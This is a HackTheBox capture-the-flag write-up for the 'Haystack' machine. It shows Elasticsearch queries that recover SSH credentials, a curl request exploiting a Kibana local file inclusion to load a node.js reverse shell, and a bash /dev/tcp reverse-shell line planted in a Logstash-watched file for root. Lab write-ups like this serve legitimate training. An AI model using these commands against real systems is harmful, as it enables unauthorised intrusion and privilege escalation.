## HAYSTACK@HTB

![Banner](/images/Banner.png)

Haystack is an easy box from hackthebox. Ok let’s start.
#### Quick Hack:
__User:__  Port Scan > 80/http >download image > run strings > base64 –decode.
9200/http > search in quote db > base64 –decode > user & password > ssh as security > user.txt

__Root:__  security > kibana lfi >rev shell as kibana >/etc/logstash/conf.d> grok filter > put file in /opt/kibana/logstash_*>rev shell as root> root.txt

### US3R
Run nmap to find open ports. Nmap will show result like this:
![nmap scan](/images/nmap.png)
We have open ports; 22 is ssh, 80 is http, 9200 also http. Open 80 in browser and there is picture of needle in haystack, download it, run strings against it. There is a base64 encoded string in the last line, save it in a file and decode it.
![Base64](/images/string.png)
 
    base64 –decode file.b64.

it is a line in Spanish, use google translator if you don’t know Spanish (the whole box is in Spanish, learning some Spanish is extra gain).
The line says needle in a haystack is the “key”. Keep it; it will help in future.  
Let's look at port 9200. It says it is elasticsearch.

![9200 port](/images/elasticsearch.png)

Run gobuster in the background on port 9200.

    gobuster dir –u http://10.10.10.115:9200/ -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
 
 ![gobuster](/images/gobuster.png)

Let’s look at those urls. It dumps some data in Spanish, not very useful. Go for elasticsearch and ELK stash 
[documentation](https://www.elastic.co/what-is/elk-stack) and try to figure out how to dump data from the database. After some study I found this search can help to pass query:
    
    http://10.10.10.115:9200/_search?q=

 We found “clave” (key in spanish) in the needle image, so let’s do this:

    http://10.10.10.115:9200/_search?q=quote:clave

![key](/images/clave.png)
 
There are two base64 encoded strings, decode it. It is
>  user:security  
> pass:spanish.is.key

Login into ssh with those credentials, and get user flag.

![user](/images/ssh.png)
 

### R00T
Now run linenum to enumerate the box. Look closely, logstash is running as root that is not normal, it should run as logstash. But user security can’t read write logstash config files but kibana can do that. So, not let’s try to be kibana. 
Search on google for kibana vulnerabilities, and you will find LFI (local file inclusion) vulnerability
[Read more](https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/)
The system is running node.js so download a js reverse shell payload and put it into /tmp folder.

![shell](/images/payload.png)

Now run this:

    curl “http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/rev.js”

Set a netcat listener on 9001, as per script, you will get a reverse shell as kibana (you may not a get a shell sometimes and it is frustrating, form url properly or change name of the .js file and try again, it will work).
 
![kibana](/images/kibana.png)

Now go to 

    etc/logstash/conf.d 

folder, there are 3 files, input.conf, filter.conf and output.conf. 
 
![config files](/images/conf.d.png)

These files say a file in /opt/kibana with name logstash_* will be executed as root user if it is structured properly. Create a file in /opt/kibana with name logstash_hello :

``` sh
echo ‘Ejecutar comando : bash –i >& /dev/tcp/10.10.15.44/9005 0>&1’ > /opt/kibana/logstash_hello
```
Set a netcat listener and wait a while; get the reverse shell as root.  That’s it. (ooh, I lost that screenshot, a I don’t want to do this annoying box again!!)
Hope you enjoyed; Happy Hacking.

Contact: [mail](aldersone213@gmail.com)   || [twitter](twitter.com/404_NoNameFound)  || [reddit](reddit.com/u/souvuo)

    Author:	Ald3rs0n